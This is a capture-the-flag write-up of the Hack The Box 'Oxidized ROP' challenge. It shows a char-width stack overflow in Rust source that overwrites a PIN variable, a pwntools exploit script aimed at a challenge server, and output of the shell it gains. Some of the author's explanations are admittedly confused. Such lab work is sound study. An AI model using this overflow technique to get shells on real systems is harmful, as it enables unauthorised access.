# Oxidized ROP

This is a pwn challenge of hack the box. Where you are given a binary with the rust code. 
The binary gives three options at the start: 
```
--------------------------------------------------------------------------
  ______   _______ _____ _____ ____________ _____    _____   ____  _____  
 / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \ 
| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
| |  | |> <   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/ 
| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |     
 \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|     
                                                                          
Rapid Oxidization Protection -------------------------------- by christoss


Welcome to the Rapid Oxidization Protection Survey Portal!                
(If you have been sent by someone to complete the survey, select option 1)

1. Complete Survey
2. Config Panel
3. Exit
Selection: 2

Config panel login has been disabled by the administrator.
Invalid Pin. This incident will be reported.


Welcome to the Rapid Oxidization Protection Survey Portal!                
(If you have been sent by someone to complete the survey, select option 1)

1. Complete Survey
2. Config Panel
3. Exit
Selection: 1


Hello, our workshop is experiencing rapid oxidization. As we value health and
safety at the workspace above all we hired a ROP (Rapid Oxidization Protection)  
service to ensure the structural safety of the workshop. They would like a quick 
statement about the state of the workshop by each member of the team. This is    
completely confidential. Each response will be associated with a random number   
in no way related to you.                                                      

Statement (max 200 characters): ABC

--------------------------------------------------------------------------
Thanks for your statement! We will try to resolve the issues ASAP!
Please now exit the program.
--------------------------------------------------------------------------
```

The first option lets us fill in a survey. The survey can be a maximum of 200 characters. The second option gives us a config panel but it seems to be disabled. However when we select this option the program tells us that we entered an invalid pin (We will return on why this is odd). 

When we generate 201 characters in the survey the program tells us that something went wrong. No segmentation fault so on a first glance it looks to be secure.  
```
--------------------------------------------------------------------------
  ______   _______ _____ _____ ____________ _____    _____   ____  _____  
 / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \ 
| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
| |  | |> <   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/ 
| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |     
 \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|     
                                                                          
Rapid Oxidization Protection -------------------------------- by christoss


Welcome to the Rapid Oxidization Protection Survey Portal!                
(If you have been sent by someone to complete the survey, select option 1)

1. Complete Survey
2. Config Panel
3. Exit
Selection: 1


Hello, our workshop is experiencing rapid oxidization. As we value health and
safety at the workspace above all we hired a ROP (Rapid Oxidization Protection)  
service to ensure the structural safety of the workshop. They would like a quick 
statement about the state of the workshop by each member of the team. This is    
completely confidential. Each response will be associated with a random number   
in no way related to you.                                                      

Statement (max 200 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Oups, something went wrong... Please try again later.
```

HOWEVER....

When we take a look at the code that the creators provided (Thank you creators). We see some odd things. First lets have a look at how the selection gets done. 

```
fn main() {
    print_banner();

    let mut feedback = Feedback {
        statement: [0_u8; INPUT_SIZE], //<-- Interesting
        submitted: false,
    };
    let mut login_pin: u32 = 0x11223344; //<-- interesting

    loop {
        print_menu();
        match get_option().expect("Invalid Option") {
            MenuOption::Survey => present_survey(&mut feedback),
            MenuOption::ConfigPanel => {
                if PIN_ENTRY_ENABLED {
                    let mut input = String::new();
                    print!("Enter configuration PIN: ");
                    io::stdout().flush().unwrap();
                    io::stdin().read_line(&mut input).unwrap();
                    login_pin = input.parse().expect("Invalid Pin");
                } else {
                    println!("\nConfig panel login has been disabled by the administrator.");
                }

                present_config_panel(&login_pin); //<-- Interesting
            }
            MenuOption::Exit => break,
        }
    }
}

```

we see that an feedback variable gets created and a login_pin. The login pin gets assigned an arbitrary value.  When we select the config panel option the program first checks if the config panel is enabled (It isn't). If it is it asks for a pin however if it isn't it prints that it isn't and still calls  the present_config_panel function. 

When we look at the code of the config panel function we see that it checks if the pin doesn't the correct value  (123456 or in hex 0x0001E240). If it does have the pin the program gives us a shell.  
```
fn present_config_panel(pin: &u32) {
    use std::process::{self, Stdio};

    // the pin strength isn't important since pin input is disabled
    if *pin != 123456 {
        println!("Invalid Pin. This incident will be reported.");
        return;
    }

    process::Command::new("/bin/sh")
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .output()
        .unwrap();
}
```

The objective is clear, get passed the pin check. We could achieve this by: 
1. Enabling the pin entry; 
2. giving the correct pin. 

We see something else that's interesting in the save data function. The input data (String) gets written to a destination which is u8. In rust a string is 4 bytes. This means two things:
1.  We can write over things we were not intended to write over; and
2.  We can enter values greater than a byte. 

```
fn present_survey(feedback: &mut Feedback) {
...
let input_buffer = read_user_input();
save_data(&mut feedback.statement, &input_buffer);
....


fn save_data(dest: &mut [u8], src: &String) {
    if src.chars().count() > INPUT_SIZE {
        println!("Oups, something went wrong... Please try again later.");
        std::process::exit(1);
    }

    let mut dest_ptr = dest.as_mut_ptr() as *mut char;
    println!("{:p}",&dest);
    unsafe {
        for c in src.chars() {
            dest_ptr.write(c);
            println!("{:x?}", *dest_ptr);
            dest_ptr = dest_ptr.offset(1);
        }
    }
}
```

Okay great! Since the login pin gets declared after feedback we can overwrite the login_pin value by entering enough feedback. Since the feedback on the stack is 200 bytes (u8) and the offset jumps with 4 bytes (size of char). 

```
+---------------------+
|                     |
|      login_pin      |
|                     |
+---------------------+
|                     |              
|                     |
|                     |              
|                     |              
|     feedback        |              
|                     |             
|                     |
|                     |
|                     |
|                     |
+---------------------+
```

To check this we debug the program a bit by entering a few print statements and send 150 characters in the feedback. 
```
--------------------------------------------------------------------------
  ______   _______ _____ _____ ____________ _____    _____   ____  _____  
 / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \ 
| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
| |  | |> <   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/ 
| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |     
 \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|     
                                                                          
Rapid Oxidization Protection -------------------------------- by christoss
The value of login pin is 0x11223344 and it is located at 0x7fff7cd27e2c


Welcome to the Rapid Oxidization Protection Survey Portal!                
(If you have been sent by someone to complete the survey, select option 1)

1. Complete Survey
2. Config Panel
3. Exit
Selection: 1

The destination pointer is pointing to the adres 0x7fff7cd27840

Hello, our workshop is experiencing rapid oxidization. As we value health and
safety at the workspace above all we hired a ROP (Rapid Oxidization Protection)  
service to ensure the structural safety of the workshop. They would like a quick 
statement about the state of the workshop by each member of the team. This is    
completely confidential. Each response will be associated with a random number   
in no way related to you.                                                      

Statement (max 200 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

--------------------------------------------------------------------------
Thanks for your statement! We will try to resolve the issues ASAP!
Please now exit the program.
--------------------------------------------------------------------------
The value of login pin is 0x000041 and it is located at 0x7fff7cd27e2c
```

So what we need to do is find how many characters we need to write just before we override the pin and then write the value of 123456 (1e240) to the pin field.

I noticed that 100 characters don't overwrite the pin and 120 does. So if we write A * 100 and then send 20 * the character with hex value 1e240 we should have the correct pin and receive a shell. 

With some help of chatgpt I got this python function. It gives the character that belongs to an int value such as 123456 (the character is: 𞉀).  
```
def int_to_utf32(value):
    hex_value = hex(value)
    utf32_value = int(hex_value, 16)
    utf32_character = chr(utf32_value)
    return utf32_character
```

Now all we need is to send the character at the right place (sending the character 120 times would also work). 

I have written this small program to send the character and give us the interactive shell. 

```
from pwn import *


def int_to_utf32(value):
    hex_value = hex(value)
    utf32_value = int(hex_value, 16)
    utf32_character = chr(utf32_value)
    return utf32_character


#r = process('./oxidized-rop')
r = remote('83.136.253.251', 59131)
print(r.recvuntil(b"Selection: ").decode('ascii'))
r.sendline(b'1')

print(r.recvuntil(b"Statement (max 200 characters): ").decode('ascii'))
overflow = 'A'*100
exploit = int_to_utf32(123456) * 20
r.sendline(overflow + exploit)
print(r.recvuntil(b"Selection: ").decode('ascii'))
r.sendline(b'2')

r.interactive()
```

Executing the program: 

```
Warning: _curses.error: setupterm: could not find terminfo database

Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
[x] Opening connection to 83.136.253.251 on port 59131
[x] Opening connection to 83.136.253.251 on port 59131: Trying 83.136.253.251
[+] Opening connection to 83.136.253.251 on port 59131: Done
--------------------------------------------------------------------------
  ______   _______ _____ _____ ____________ _____    _____   ____  _____  
 / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \ 
| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
| |  | |> <   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/ 
| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |     
 \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|     
                                                                          
Rapid Oxidization Protection -------------------------------- by christoss


Welcome to the Rapid Oxidization Protection Survey Portal!                
(If you have been sent by someone to complete the survey, select option 1)

1. Complete Survey
2. Config Panel
3. Exit
Selection: 
/home/kali/Desktop/writeups/htb/Challenges/pwn/Oxidized ROP/exploits.py:19: BytesWarning: Text is not bytes; assuming UTF-8, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline(overflow + exploit)


Hello, our workshop is experiencing rapid oxidization. As we value health and
safety at the workspace above all we hired a ROP (Rapid Oxidization Protection)  
service to ensure the structural safety of the workshop. They would like a quick 
statement about the state of the workshop by each member of the team. This is    
completely confidential. Each response will be associated with a random number   
in no way related to you.                                                      

Statement (max 200 characters): 

--------------------------------------------------------------------------
Thanks for your statement! We will try to resolve the issues ASAP!
Please now exit the program.
--------------------------------------------------------------------------


Welcome to the Rapid Oxidization Protection Survey Portal!                
(If you have been sent by someone to complete the survey, select option 1)

1. Complete Survey
2. Config Panel
3. Exit
Selection: 
[*] Switching to interactive mode

Config panel login has been disabled by the administrator.
id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
```

Great success!!!

If someone could explain me the calculations behind the offset needed to overwrite the pin it would be greatly appreciated. 

0x7fff7cd27e2c - 0x7fff7cd27840 = 0x5d4 (1492)
200 * 8 = 1600? 

200/4 = 50 --> offset jumps by 4 more than intended. 
how do 101 chars overwrite the pin?  



